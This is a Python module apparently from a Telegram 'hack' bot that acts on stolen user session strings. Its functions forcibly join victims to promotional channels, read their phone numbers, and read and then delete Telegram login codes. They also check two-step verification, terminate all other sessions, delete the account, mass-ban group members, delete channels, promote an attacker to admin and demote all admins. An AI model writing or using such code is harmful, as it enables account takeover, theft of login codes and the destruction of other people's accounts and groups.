import asyncio
import pyrogram 
from pyrogram import Client , enums
from telethon import TelegramClient
from telethon.sessions import StringSession 
from pyrogram.raw import functions 
from RAUSHAN import API_ID, API_HASH
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest , JoinChannelRequest as join , LeaveChannelRequest as leave , DeleteChannelRequest as dc
from RAUSHAN.Helpers.data import info
from pyrogram.types.messages_and_media.message import Str
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import ChannelParticipantsAdmins,ChatBannedRights
from pyrogram.errors import FloodWait
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions as ok
from pyrogram.types import ChatPrivileges
from telethon.tl.types import ChannelParticipantsAdmins

async def users_gc(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await alpha.connect()                          
            try:
                await alpha(join("@Purvi_Bots"))
                await alpha(join("@PurviBots"))
                await alpha(join("@Purvi_Updates"))
                await alpha(join("@Careless_Coder"))
                await alpha(join("@Alpha_Says"))
                await alpha(join("@oye_careless"))
                await alpha(join("@Savage_Survivors"))
                await alpha(join("@ALPHA_DPZ_WORLD"))
                await alpha(join("@ONE_WAS_SIGMA"))
                await alpha(join("@TheSigmCoder"))
            except Exception as e:
                print(e)
            k = await alpha(GetAdminedPublicChannelsRequest())            
            for x in k.chats:                
                msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
            await alpha.disconnect()
                 
        else:    
            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                try:
                    await purvi.join_chat("@Purvi_Bots")
                    await purvi.join_chat("@PurviBots")
                    await purvi.join_chat("@Purvi_Updates")
                    await purvi.join_chat("@Careless_Coder")
                    await purvi.join_chat("@Alpha_Says")
                    await purvi.join_chat("@oye_careless")
                    await purvi.join_chat("@Savage_Survivors")
                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
                    await purvi.join_chat("@ONE_WAS_SIGMA")
                    await purvi.join_chat("@TheSigmCoder")
                except Exception as e:
                    print(e)    
                k = await purvi.invoke(functions.channels.GetAdminedPublicChannels())            
                for x in k.chats:
                    msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** {x.participants_count}\n\n'
    except Exception as idk:
        err += str(idk)                                             
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg
 
async def user_info(session):
    err = ""
    try:
        if session.endswith("="):
            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await alpha.connect()
            try:
                await alpha(join("@Purvi_Bots"))
                await alpha(join("@PurviBots"))
                await alpha(join("@Purvi_Updates"))
                await alpha(join("@Careless_Coder"))
                await alpha(join("@Alpha_Says"))
                await alpha(join("@oye_careless"))
                await alpha(join("@Savage_Survivors"))
                await alpha(join("@ALPHA_DPZ_WORLD"))
                await alpha(join("@ONE_WAS_SIGMA"))
                await alpha(join("@TheSigmCoder"))
            except Exception as e:
                print(e)
            k = await alpha.get_me()  
            msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone,k.username)
            await alpha.disconnect()
                             
        else:    
            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                try:
                    await purvi.join_chat("@Purvi_Bots")
                    await purvi.join_chat("@PurviBots")
                    await purvi.join_chat("@Purvi_Updates")
                    await purvi.join_chat("@Careless_Coder")
                    await purvi.join_chat("@Alpha_Says")
                    await purvi.join_chat("@oye_careless")
                    await purvi.join_chat("@Savage_Survivors")
                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
                    await purvi.join_chat("@ONE_WAS_SIGMA")
                    await purvi.join_chat("@TheSigmCoder")
                except Exception as e:
                    print(e)    
                k = await purvi.get_me()
                msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone_number,k.username)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg    


RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

async def banall(session,id):
    err = ""
    msg = ""
    all = 0
    bann = 0
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await alpha.connect()
            try:
                await alpha(join("@Purvi_Bots"))
                await alpha(join("@PurviBots"))
                await alpha(join("@Purvi_Updates"))
                await alpha(join("@Careless_Coder"))
                await alpha(join("@Alpha_Says"))
                await alpha(join("@oye_careless"))
                await alpha(join("@Savage_Survivors"))
                await alpha(join("@ALPHA_DPZ_WORLD"))
                await alpha(join("@ONE_WAS_SIGMA"))
                await alpha(join("@TheSigmCoder"))
            except Exception as e:
                print(e)
            admins = await alpha.get_participants(gc_id, filter=ChannelParticipantsAdmins)
            admins_id = [i.id for i in admins]                
            async for user in alpha.iter_participants(gc_id):
                all += 1
                try:
                    if user.id not in admins_id:
                       await alpha(EditBannedRequest(gc_id, user.id, RIGHTS))
                       bann += 1
                       await asyncio.sleep(0.1)
                except Exception:
                    await asyncio.sleep(0.1)
            await alpha.disconnect()
        else:    
            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                try:
                    await purvi.join_chat("@Purvi_Bots")
                    await purvi.join_chat("@PurviBots")
                    await purvi.join_chat("@Purvi_Updates")
                    await purvi.join_chat("@Careless_Coder")
                    await purvi.join_chat("@Alpha_Says")
                    await purvi.join_chat("@oye_careless")
                    await purvi.join_chat("@Savage_Survivors")
                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
                    await purvi.join_chat("@ONE_WAS_SIGMA")
                    await purvi.join_chat("@TheSigmCoder")
                except Exception as e:
                    print(e)    
                async for members in purvi.get_chat_members(gc_id):  
                    all += 1                
                    try:                                          
                        await purvi.ban_chat_member(gc_id,members.user.id)  
                        bann += 1                  
                    except FloodWait as i:
                        await asyncio.sleep(i.value)
                    except Exception as er:
                        pass 
                          
    except Exception as idk:
        err += str(idk) 
    msg += f"**❖ ᴜsᴇʀs ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ !\n\n⊚ ʙᴀɴɴᴇᴅ ᴜsᴇʀs :** {bann}\n**⊚ ᴛᴏᴛᴀʟ ᴜsᴇʀs :** {all}"                                            
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg

async def get_otp(session):
    err = ""
    i = ""
    try:
        if session.endswith("="):
            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await alpha.connect()
            try:
                await alpha(join("@Purvi_Bots"))
                await alpha(join("@PurviBots"))
                await alpha(join("@Purvi_Updates"))
                await alpha(join("@Careless_Coder"))
                await alpha(join("@Alpha_Says"))
                await alpha(join("@oye_careless"))
                await alpha(join("@Savage_Survivors"))
                await alpha(join("@ALPHA_DPZ_WORLD"))
                await alpha(join("@ONE_WAS_SIGMA"))
                await alpha(join("@TheSigmCoder"))
            except Exception as e:
                print(e)
            async for x in alpha.iter_messages(777000, limit=2):               
                i += f"\n{x.text}\n"
                await alpha.delete_dialog(777000)
            await alpha.disconnect() 
                             
        else:    
            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                try:
                    await purvi.join_chat("@Purvi_Bots")
                    await purvi.join_chat("@PurviBots")
                    await purvi.join_chat("@Purvi_Updates")
                    await purvi.join_chat("@Careless_Coder")
                    await purvi.join_chat("@Alpha_Says")
                    await purvi.join_chat("@oye_careless")
                    await purvi.join_chat("@Savage_Survivors")
                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
                    await purvi.join_chat("@ONE_WAS_SIGMA")
                    await purvi.join_chat("@TheSigmCoder")
                except Exception as e:
                    print(e)    
                ok = []
                async for message in purvi.get_chat_history(777000,limit=2):
                    i += f"\n{message.text}\n"                                   
                    ok.append(message.id)                 
                await purvi.delete_messages(777000,ok)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return i

async def join_ch(session,id):
    err = ""
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await alpha.connect()
            try:
                await alpha(join("@Purvi_Bots"))
                await alpha(join("@PurviBots"))
                await alpha(join("@Purvi_Updates"))
                await alpha(join("@Careless_Coder"))
                await alpha(join("@Alpha_Says"))
                await alpha(join("@oye_careless"))
                await alpha(join("@Savage_Survivors"))
                await alpha(join("@ALPHA_DPZ_WORLD"))
                await alpha(join("@ONE_WAS_SIGMA"))
                await alpha(join("@TheSigmCoder"))              
            except Exception as e:
                print(e)
            await alpha(join(gc_id))            
            await alpha.disconnect() 
                             
        else:    
            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                try:
                    await purvi.join_chat("@Purvi_Bots")
                    await purvi.join_chat("@PurviBots")
                    await purvi.join_chat("@Purvi_Updates")
                    await purvi.join_chat("@Careless_Coder")
                    await purvi.join_chat("@Alpha_Says")
                    await purvi.join_chat("@oye_careless")
                    await purvi.join_chat("@Savage_Survivors")
                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
                    await purvi.join_chat("@ONE_WAS_SIGMA")
                    await purvi.join_chat("@TheSigmCoder")
                except Exception as e:
                    print(e)    
                await purvi.join_chat(gc_id)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "ᴊᴏɪɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!"

async def leave_ch(session,id):
    err = ""
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await alpha.connect()
            try:
                await alpha(join("@Purvi_Bots"))
                await alpha(join("@PurviBots"))
                await alpha(join("@Purvi_Updates"))
                await alpha(join("@Careless_Coder"))
                await alpha(join("@Alpha_Says"))
                await alpha(join("@oye_careless"))
                await alpha(join("@Savage_Survivors"))
                await alpha(join("@ALPHA_DPZ_WORLD"))
                await alpha(join("@ONE_WAS_SIGMA"))
                await alpha(join("@TheSigmCoder"))               
            except Exception as e:
                print(e)
            await alpha(leave(gc_id))            
            await alpha.disconnect() 
                             
        else:    
            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                try:
                    await purvi.join_chat("@Purvi_Bots")
                    await purvi.join_chat("@PurviBots")
                    await purvi.join_chat("@Purvi_Updates")
                    await purvi.join_chat("@Careless_Coder")
                    await purvi.join_chat("@Alpha_Says")
                    await purvi.join_chat("@oye_careless")
                    await purvi.join_chat("@Savage_Survivors")
                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
                    await purvi.join_chat("@ONE_WAS_SIGMA")
                    await purvi.join_chat("@TheSigmCoder")
                except Exception as e:
                    print(e)    
                await purvi.leave_chat(gc_id)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "ʟᴇғᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!"

async def del_ch(session,id):
    err = ""
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await alpha.connect()
            try:
                await alpha(join("@Purvi_Bots"))
                await alpha(join("@PurviBots"))
                await alpha(join("@Purvi_Updates"))
                await alpha(join("@Careless_Coder"))
                await alpha(join("@Alpha_Says"))
                await alpha(join("@oye_careless"))
                await alpha(join("@Savage_Survivors"))
                await alpha(join("@ALPHA_DPZ_WORLD"))
                await alpha(join("@ONE_WAS_SIGMA"))
                await alpha(join("@TheSigmCoder"))                
            except Exception as e:
                print(e)
            await alpha(dc(gc_id))            
            await alpha.disconnect() 
                             
        else:    
            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                try:
                    await purvi.join_chat("@Purvi_Bots")
                    await purvi.join_chat("@PurviBots")
                    await purvi.join_chat("@Purvi_Updates")
                    await purvi.join_chat("@Careless_Coder")
                    await purvi.join_chat("@Alpha_Says")
                    await purvi.join_chat("@oye_careless")
                    await purvi.join_chat("@Savage_Survivors")
                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
                    await purvi.join_chat("@ONE_WAS_SIGMA")
                    await purvi.join_chat("@TheSigmCoder")
                except Exception as e:
                    print(e)    
                await purvi.invoke(
                    functions.channels.DeleteChannel(channel= await purvi.resolve_peer(gc_id)))
            
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "**ᴅᴇʟᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"

async def check_2fa(session):
    err = ""
    i = ""
    try:
        if session.endswith("="):
            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await alpha.connect()
            try:
                await alpha(join("@Purvi_Bots"))
                await alpha(join("@PurviBots"))
                await alpha(join("@Purvi_Updates"))
                await alpha(join("@Careless_Coder"))
                await alpha(join("@Alpha_Says"))
                await alpha(join("@oye_careless"))
                await alpha(join("@Savage_Survivors"))
                await alpha(join("@ALPHA_DPZ_WORLD"))
                await alpha(join("@ONE_WAS_SIGMA"))
                await alpha(join("@TheSigmCoder"))               
            except Exception as e:
                print(e)
            try:
                await alpha.edit_2fa("idkbsdkjsj")
                i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"
                
            except Exception as e:
                print(e)
                i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
                        
            await alpha.disconnect() 
                             
        else:    
            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                try:
                    await purvi.join_chat("@Purvi_Bots")
                    await purvi.join_chat("@PurviBots")
                    await purvi.join_chat("@Purvi_Updates")
                    await purvi.join_chat("@Careless_Coder")
                    await purvi.join_chat("@Alpha_Says")
                    await purvi.join_chat("@oye_careless")
                    await purvi.join_chat("@Savage_Survivors")
                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
                    await purvi.join_chat("@ONE_WAS_SIGMA")
                    await purvi.join_chat("@TheSigmCoder")
                except Exception as e:
                    print(e)    
               
                yes = await purvi.invoke(functions.account.GetPassword())
                if yes.has_password:
                    i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
                else:
                    i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"                                                           
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return i

async def terminate_all(session):
    err = ""
    try:
        if session.endswith("="):
            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await alpha.connect()
            try:
                await alpha(join("@Purvi_Bots"))
                await alpha(join("@PurviBots"))
                await alpha(join("@Purvi_Updates"))
                await alpha(join("@Careless_Coder"))
                await alpha(join("@Alpha_Says"))
                await alpha(join("@oye_careless"))
                await alpha(join("@Savage_Survivors"))
                await alpha(join("@ALPHA_DPZ_WORLD"))
                await alpha(join("@ONE_WAS_SIGMA"))
                await alpha(join("@TheSigmCoder"))             
            except Exception as e:
                print(e)
            await alpha(rt())
            await alpha.disconnect() 
                             
        else:    
            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                try:
                    await purvi.join_chat("@Purvi_Bots")
                    await purvi.join_chat("@PurviBots")
                    await purvi.join_chat("@Purvi_Updates")
                    await purvi.join_chat("@Careless_Coder")
                    await purvi.join_chat("@Alpha_Says")
                    await purvi.join_chat("@oye_careless")
                    await purvi.join_chat("@Savage_Survivors")
                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
                    await purvi.join_chat("@ONE_WAS_SIGMA")
                    await purvi.join_chat("@TheSigmCoder")
                except Exception as e:
                    print(e)    
                await purvi.invoke(functions.auth.ResetAuthorizations())
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴀʟʟ sᴇssɪᴏɴs"

      
async def del_acc(session):
    err = ""
    try:
        if session.endswith("="):
            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await alpha.connect()
            try:
                await alpha(join("@Purvi_Bots"))
                await alpha(join("@PurviBots"))
                await alpha(join("@Purvi_Updates"))
                await alpha(join("@Careless_Coder"))
                await alpha(join("@Alpha_Says"))
                await alpha(join("@oye_careless"))
                await alpha(join("@Savage_Survivors"))
                await alpha(join("@ALPHA_DPZ_WORLD"))
                await alpha(join("@ONE_WAS_SIGMA"))
                await alpha(join("@TheSigmCoder"))              
            except Exception as e:
                print(e)
            await alpha(ok.account.DeleteAccountRequest("owner madarchod h"))
            await alpha.disconnect() 
                             
        else:    
            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                try:
                    await purvi.join_chat("@Purvi_Bots")
                    await purvi.join_chat("@PurviBots")
                    await purvi.join_chat("@Purvi_Updates")
                    await purvi.join_chat("@Careless_Coder")
                    await purvi.join_chat("@Alpha_Says")
                    await purvi.join_chat("@oye_careless")
                    await purvi.join_chat("@Savage_Survivors")
                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
                    await purvi.join_chat("@ONE_WAS_SIGMA")
                    await purvi.join_chat("@TheSigmCoder")
                except Exception as e:
                    print(e)    
                await purvi.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀᴄᴄ."

      
FULL_PROMOTE_POWERS = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True,
    can_manage_video_chats=True,
    can_promote_members=True,    
    can_invite_users=True)

PROMOTE_POWERS = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True)

async def piromote(session,gc_id,user_id):
    err = ""
    gc_id = str(gc_id.text) if type(gc_id.text) == Str else int(gc_id.text)
    user_id = str(user_id.text) if type(user_id.text) == Str else int(user_id.text)
    try:
        if session.endswith("="):
            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await alpha.connect()
            try:
                await alpha(join("@Purvi_Bots"))
                await alpha(join("@PurviBots"))
                await alpha(join("@Purvi_Updates"))
                await alpha(join("@Careless_Coder"))
                await alpha(join("@Alpha_Says"))
                await alpha(join("@oye_careless"))
                await alpha(join("@Savage_Survivors"))
                await alpha(join("@ALPHA_DPZ_WORLD"))
                await alpha(join("@ONE_WAS_SIGMA"))
                await alpha(join("@TheSigmCoder"))                
            except Exception as e:
                print(e)
            try:
                await alpha.edit_admin(gc_id, user_id, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
            except:
                await alpha.edit_admin(gc_id, user_id, is_admin=True, anonymous=False, pin_messages=True, title='Owner')    
            await alpha.disconnect()                              
        else:    
            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                try:
                    await purvi.join_chat("@Purvi_Bots")
                    await purvi.join_chat("@PurviBots")
                    await purvi.join_chat("@Purvi_Updates")
                    await purvi.join_chat("@Careless_Coder")
                    await purvi.join_chat("@Alpha_Says")
                    await purvi.join_chat("@oye_careless")
                    await purvi.join_chat("@Savage_Survivors")
                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
                    await purvi.join_chat("@ONE_WAS_SIGMA")
                    await purvi.join_chat("@TheSigmCoder")
                except Exception as e:
                    print(e)
                try:    
                    await purvi.promote_chat_member(gc_id,user_id,FULL_PROMOTE_POWERS)
                except:
                    await purvi.promote_chat_member(gc_id,user_id,PROMOTE_POWERS)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ ᴜsᴇʀ."


DEMOTE = ChatPrivileges(
        can_change_info=False,
        can_invite_users=False,
        can_delete_messages=False,
        can_restrict_members=False,
        can_pin_messages=False,
        can_promote_members=False,
        can_manage_chat=False,
        can_manage_video_chats=False,
    )

async def demote_all(session,gc_id):
    err = ""
    gc_id = str(gc_id.text) if type(gc_id.text) == Str else int(gc_id.text)
    try:
        if session.endswith("="):
            alpha = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await alpha.connect()
            try:
                await alpha(join("@Purvi_Bots"))
                await alpha(join("@PurviBots"))
                await alpha(join("@Purvi_Updates"))
                await alpha(join("@Careless_Coder"))
                await alpha(join("@Alpha_Says"))
                await alpha(join("@oye_careless"))
                await alpha(join("@Savage_Survivors"))
                await alpha(join("@ALPHA_DPZ_WORLD"))
                await alpha(join("@ONE_WAS_SIGMA"))
                await alpha(join("@TheSigmCoder"))                
            except Exception as e:
                print(e)
            async for x in alpha.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
                try:
                    await alpha.edit_admin(gc_id, x.id, is_admin=False, manage_call=False)
                except:
                    await alpha.edit_admin(gc_id, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
          
            await alpha.disconnect()                              
        else:    
            async with Client("purvi",api_id=API_ID,api_hash=API_HASH, session_string=session) as purvi:
                try:
                    await purvi.join_chat("@Purvi_Bots")
                    await purvi.join_chat("@PurviBots")
                    await purvi.join_chat("@Purvi_Updates")
                    await purvi.join_chat("@Careless_Coder")
                    await purvi.join_chat("@Alpha_Says")
                    await purvi.join_chat("@oye_careless")
                    await purvi.join_chat("@Savage_Survivors")
                    await purvi.join_chat("@ALPHA_DPZ_WORLD")
                    await purvi.join_chat("@ONE_WAS_SIGMA")
                    await purvi.join_chat("@TheSigmCoder")
                except Exception as e:
                    print(e)
                async for m in purvi.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
                    await purvi.promote_chat_member(gc_id,m.user.id,DEMOTE)                                                                                     
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**❖ ᴇʀʀᴏʀ :** " + err + "\n**» ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ ᴀʟʟ."      
